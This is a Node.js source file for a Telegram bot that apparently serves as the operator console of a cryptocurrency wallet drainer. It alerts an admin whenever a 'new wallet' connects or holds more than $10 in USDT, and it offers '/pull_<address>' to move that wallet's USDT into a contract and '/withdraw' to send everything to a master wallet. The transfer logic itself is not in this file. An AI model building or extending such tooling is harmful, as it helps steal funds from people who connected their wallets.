const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
    }

    // Simple initialization - works with both polling and webhook
    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }
        
        try {
            // Create bot instance - Render will handle webhook setup
            this.bot = new TelegramBot(this.botToken);
            
            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;
            
            console.log('✅ Telegram bot initialized');
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error.message);
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            console.log('Received /start command from chat:', msg.chat.id);
            this.sendWelcomeMessage(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            console.log('Received /help command from chat:', msg.chat.id);
            this.sendWelcomeMessage(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            console.log('Received /pull command from chat:', msg.chat.id);
            const walletAddress = match[1];
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        // Withdraw command
        this.bot.onText(/\/withdraw/, (msg) => {
            console.log('Received /withdraw command from chat:', msg.chat.id);
            this.handleWithdrawCommand(msg.chat.id);
        });

        // Balances command
        this.bot.onText(/\/balances/, (msg) => {
            console.log('Received /balances command from chat:', msg.chat.id);
            this.handleBalancesCommand(msg.chat.id);
        });
    }

    async sendWelcomeMessage(chatId) {
        const message = `
🤖 Welcome to Multi Wallet Manager Bot!

Available commands:
• /pull_<address> - Pull USDT from wallet
• /withdraw - Withdraw all USDT from contract
• /balances - Check all wallet balances
• /help - Show this help message

Security Note: Only authorized admins can execute sensitive commands.
        `;
        
        try {
            const result = await this.bot.sendMessage(chatId, message);
            console.log('Welcome message sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending welcome message to chat', chatId, ':', error.message);
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) {
            console.log('Telegram bot not ready for sending alerts');
            return;
        }
        
        const message = `
🔔 NEW WALLET CONNECTED
Address: ${walletAddress}
USDT Balance: ${balance} USDT

Actions:
• /pull_${walletAddress} - Pull USDT to contract
        `;
        
        try {
            const result = await this.bot.sendMessage(this.adminChatId, message);
            console.log('New wallet alert sent to admin chat');
            return result;
        } catch (error) {
            console.error('Error sending new wallet alert:', error.message);
        }
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const message = `
💰 BALANCE ALERT
Address: ${walletAddress}
USDT Balance: ${balance} USDT (> $10)

Actions:
• /pull_${walletAddress} - Pull USDT to contract
        `;
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message);
        } catch (error) {
            console.error('Error sending balance alert:', error.message);
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;
        
        const message = `
✅ SUCCESSFUL PULL
Address: ${walletAddress}
Amount: ${amount} USDT
Transaction: ${txHash}
        `;
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message);
        } catch (error) {
            console.error('Error sending success message:', error.message);
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
        }
        
        const message = `
🔄 Pull Operation Initiated
Wallet: ${walletAddress}

Processing... This will:
1. Check wallet gas balance
2. Send gas if needed
3. Pull USDT to contract
4. Send confirmation
        `;
        
        return this.bot.sendMessage(chatId, message);
    }

    async handleWithdrawCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const message = `
🏦 Withdraw Operation Initiated
Withdrawing all USDT from contract to master wallet...
        `;
        
        return this.bot.sendMessage(chatId, message);
    }

    async handleBalancesCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const message = `
📊 Wallet Balances Requested
Fetching wallet balances... This may take a moment.
        `;
        
        return this.bot.sendMessage(chatId, message);
    }

    async sendMessage(chatId, message, options = {}) {
        if (!this.bot) return;
        try {
            return await this.bot.sendMessage(chatId, message, options);
        } catch (error) {
            console.error('Error sending message:', error.message);
        }
    }

    // Process webhook updates
    async processUpdate(update) {
        if (this.bot) {
            try {
                await this.bot.processUpdate(update);
            } catch (error) {
                console.error('Error processing Telegram update:', error.message);
            }
        }
    }
}

module.exports = new TelegramService();
